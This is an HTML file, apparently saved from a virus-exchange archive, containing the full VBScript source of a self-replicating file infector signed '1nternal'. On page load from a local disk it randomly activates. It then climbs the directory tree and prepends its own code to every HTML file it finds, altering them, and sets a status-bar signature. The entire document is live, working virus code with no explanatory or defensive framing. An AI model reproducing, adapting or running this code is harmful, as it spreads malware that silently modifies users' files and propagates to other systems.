<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0052)http://vx.netlux.org/bin/html/Internal/HTML.Internal -->
<HTML><HEAD><!--1nternal-->
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content=1nternal name=Author>
<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
<BODY onload=CheckOffline();>
<SCRIPT language=VBScript><!--

Sub CheckOffline
	Randomize
	If location.protocol = "file:" AND (Int((6 * Rnd) + 1) = 1) then Call Offline
End Sub

Sub Offline
	Dim FSO,folder ,fc, f1, cpath
	Set FSO = CreateObject("Scripting.FileSystemObject")
	HostPath = Replace(location.href, "file:///", "")
	HostPath = Replace(HostPath, "/", "\")
	cpath = fso.GetParentFolderName(HostPath)
	Set folder = fso.GetFolder(cpath)

	While folder.IsRootFolder = false 
		Set folder = fso.GetFolder(cpath)
		Set fc = folder.Files
		cpath = fso.GetParentFolderName(cpath)
		For each f1 in fc
			s = Lcase(Fso.GetExtensionName(f1.name))
			if s = "htm" or s = "html" AND f1.path <> HostPath then
				Set fh = fso.opentextfile(f1.path, 1, true)
				TestString = fh.readline
				fh.close
				if TestString <> "<html> <!--1nternal-->" then
					Set fh = fso.opentextfile(HostPath, 1, true)
					TempFile = fso.GetTempName
					fso.CopyFile f1.path, TempFile
					Set fv = fso.opentextfile(f1.path, 2, true)
					For j = 1 to 60
						fv.Writeline fh.ReadLine
					Next
					fh.close
					fv.close
					Set fh = fso.opentextfile(TempFile, 1, true)
					Set fv = fso.opentextfile(f1.path, 8, true)
					Do While fh.AtEndOfStream <> True  
						fv.WriteLine fh.ReadLine
					Loop
					fv.close
					fh.close
					fso.DeleteFile TempFile
				end if
			end if
		Next
	Wend
	window.status = "HTML.Prepend /1nternal"
End Sub
--></SCRIPT>
</BODY></HTML>
